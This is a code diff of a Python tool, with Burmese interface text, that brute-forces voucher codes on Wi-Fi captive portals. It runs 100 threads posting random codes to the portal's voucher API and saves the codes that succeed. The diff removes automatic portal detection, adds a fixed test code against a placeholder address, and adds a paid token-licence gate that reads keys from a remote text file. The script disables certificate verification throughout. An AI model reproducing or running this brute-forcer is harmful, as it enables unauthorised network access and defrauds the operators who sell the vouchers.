@@ -14,8 +14,10 @@ ssl._create_default_https_context = ssl._create_unverified_context
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURATION ---
+KEYS_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
 TRIED_CODES_FILE = "tried_codes.txt"
 SUCCESS_CODES_FILE = "success.txt"
+CODE_TO_TEST = "536884" 
 VOUCHER_THREADS = 100 
 
 # --- CLEAR SCREEN FUNCTION ---
@@ -37,32 +39,66 @@ def save_success_code(code):
     with open(SUCCESS_CODES_FILE, "a") as f:
         f.write(f"{code}\n")
 
+# --- TOKEN LICENSE SYSTEM ---
+def check_license():
+    clear_screen()
+    print("========================================")
+    print("       🔑 TOKEN ACCESS SYSTEM         ")
+    print("========================================\n")
+    
+    try:
+        url_with_cache_buster = f"{KEYS_URL}?t={int(time.time())}"
+        response = requests.get(url_with_cache_buster, timeout=10)
+        lines = response.text.splitlines()
+    except Exception as e:
+        print(f"❌ Connection Error: {e}")
+        return False
+        
+    user_token = input("👉 သင့် Token ကိုရိုက်ထည့်ပါ: ")
+    
+    for line in lines:
+        if "|" not in line or line.startswith("#"): continue
+        try:
+            key, start_date_str, unit, amount = line.split("|")
+            start_date = datetime.strptime(start_date_str, "%Y-%m-%d")
+            amount = int(amount)
+        except: continue
+        
+        if key == user_token:
+            if unit == 'd':
+                end_date = start_date + timedelta(days=amount)
+            elif unit == 'h':
+                end_date = start_date + timedelta(hours=amount)
+            elif unit == 'm':
+                end_date = start_date + timedelta(minutes=amount)
+            else:
+                return False
+            
+            remaining = end_date - datetime.now()
+            
+            if remaining.total_seconds() <= 0:
+                print("\n❌ သက်တမ်းကုန်ဆုံးသွားပါပြီ။")
+                return False
+            else:
+                print(f"\n✅ သက်တမ်းရှိသည်။ ကုန်ဆုံးချိန်: {end_date}")
+                time.sleep(2)
+                return True
+            
+    print("\n❌ Token မှားယွင်းနေပါသည်။")
+    return False
+
 # --- MENU SYSTEM ---
 def show_menu():
     clear_screen()
     print("========================================")
-    print("         🛠️  VOUCHER HARVESTER          ")
+    print("         🛠️  MAIN MENU                ")
     print("========================================")
-    print("1. 🌐 Internet Access (Use Success Code)")
-    print("2. 🔍 Fast Random Voucher Harvesting")
+    print("1. 🌐 Internet Access")
+    print(f"2. 🔍 Test Specific Code: {CODE_TO_TEST}")
     print("3. 📋 View Success Codes")
     print("========================================\n")
     choice = input("👉 ရွေးချယ်ပါ (1-3): ")
     return choice
-
-# --- PORTAL AUTO DETECT ---
-def get_portal_info():
-    """Captive Portal URL ကို အလိုအလျောက်ရှာဖွေခြင်း"""
-    test_url = "http://connectivitycheck.gstatic.com/generate_204"
-    try:
-        r = requests.get(test_url, allow_redirects=True, timeout=5)
-        if r.url != test_url:
-            from urllib.parse import urlparse
-            parsed = urlparse(r.url)
-            return f"{parsed.scheme}://{parsed.netloc}", r.url
-    except:
-        pass
-    return None, None
 
 # --- FAST RANDOM VOUCHER HARVESTING LOGIC ---
 def test_code(code, portal_host, sid, session):
@@ -70,17 +106,14 @@ def test_code(code, portal_host, sid, session):
     voucher_api = f"{portal_host}/api/auth/voucher/"
     try:
         # --- API CALL စမ်းသပ်သည့်နေရာ ---
-        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
+        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
         
-        # --- RESPONSE စစ်ဆေးခြင်း ---
-        if v_res.status_code == 200:
-            if "success" in v_res.text.lower():
-                print(f"\n\033[92m✅ SUCCESS! Valid Code Found: {code}\033[0m")
-                save_success_code(code)
-                return True
-            else:
-                # print(f"❌ FAIL: {code} - {v_res.text}") # debug
-                pass
+        if v_res.status_code == 200 and "success" in v_res.text.lower():
+            # SUCCESS အစိမ်းရောင်တန်းကျလာမည်
+            print(f"\n\033[92m✅ SUCCESS! Found Code: {code}\033[0m")
+            save_tried_code(code)
+            save_success_code(code)
+            return True
     except:
         pass
     
@@ -93,19 +126,10 @@ def start_voucher_harvesting():
     tried_codes = load_tried_codes()
     print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")
 
-    portal_host, portal_url = get_portal_info()
-    if not portal_host:
-        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။ WiFi သေချာချိတ်ပါ။")
-        return
-
-    # SID ယူခြင်း
+    # Example placeholders
+    portal_host = "http://192.168.60.1" 
+    sid = "example_session_id"
     session = requests.Session()
-    try:
-        r2 = session.get(portal_url, verify=False, timeout=10)
-        sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
-        sid = sid_match.group(1) if sid_match else "unknown"
-    except:
-        sid = "unknown"
 
     threads = []
     
@@ -131,48 +155,24 @@ def start_voucher_harvesting():
             
         print(f"\r🔍 Random စမ်းသပ်နေသည်: {code}", end="", flush=True)
 
-# --- INTERNET ACCESS LOGIC ---
-def use_internet_access():
-    print("\n🌐 Internet Access အတွက် Code စစ်ဆေးနေသည်...")
+# --- SPECIFIC CODE TESTER ---
+def test_specific_code():
+    print(f"\n🔍 စမ်းသပ်နေသည်: {CODE_TO_TEST} ...")
     
-    if not os.path.exists(SUCCESS_CODES_FILE):
-        print("❌ Success Codes များမရှိပါ။")
-        time.sleep(2)
-        return
-
-    with open(SUCCESS_CODES_FILE, "r") as f:
-        codes = f.readlines()
-        if not codes:
-            print("❌ Success Codes များမရှိပါ။")
-            time.sleep(2)
-            return
-        code = codes[-1].strip() # နောက်ဆုံးရတဲ့ code ကိုသုံးမယ်
-
-    print(f"📡 သုံးစွဲမည့် Code: {code}")
-    
-    portal_host, portal_url = get_portal_info()
-    if not portal_host:
-        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
-        return
-
-    # SID ယူခြင်း
+    portal_host = "http://192.168.60.1" 
+    sid = "example_session_id"
     session = requests.Session()
-    try:
-        r2 = session.get(portal_url, verify=False, timeout=10)
-        sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
-        sid = sid_match.group(1) if sid_match else "unknown"
-    except:
-        sid = "unknown"
     
     voucher_api = f"{portal_host}/api/auth/voucher/"
     
     try:
-        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+        v_res = session.post(voucher_api, json={'accessCode': CODE_TO_TEST, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
         
         if v_res.status_code == 200 and "success" in v_res.text.lower():
-            print(f"\n\033[92m✅ SUCCESS! Internet Access Connected with Code: {code}\033[0m")
+            print(f"\n\033[92m✅ SUCCESS! Valid Code Found: {CODE_TO_TEST}\033[0m")
+            save_success_code(CODE_TO_TEST)
         else:
-            print(f"\n❌ FAIL! Cannot connect with code: {code}")
+            print(f"\n❌ FAIL! Invalid Code: {CODE_TO_TEST}")
             
     except Exception as e:
         print(f"\n❌ Error: {e}")
@@ -181,19 +181,20 @@ def use_internet_access():
 
 # --- MAIN RUNNER ---
 if __name__ == "__main__":
-    choice = show_menu()
-    if choice == '1':
-        use_internet_access()
-    elif choice == '2':
-        start_voucher_harvesting()
-    elif choice == '3':
-        print("\n📋 Success Code များ:")
-        if os.path.exists(SUCCESS_CODES_FILE):
-            with open(SUCCESS_CODES_FILE, "r") as f:
-                print(f.read())
+    if check_license():
+        choice = show_menu()
+        if choice == '1':
+            print("\n🌐 Internet Access... (Logic implementation needed)")
+        elif choice == '2':
+            test_specific_code()
+        elif choice == '3':
+            print("\n📋 Success Code များ:")
+            if os.path.exists(SUCCESS_CODES_FILE):
+                with open(SUCCESS_CODES_FILE, "r") as f:
+                    print(f.read())
+            else:
+                print("No success codes found.")
+            time.sleep(5)
         else:
-            print("No success codes found.")
-        time.sleep(5)
-    else:
-        print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
-        
+            print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
+            
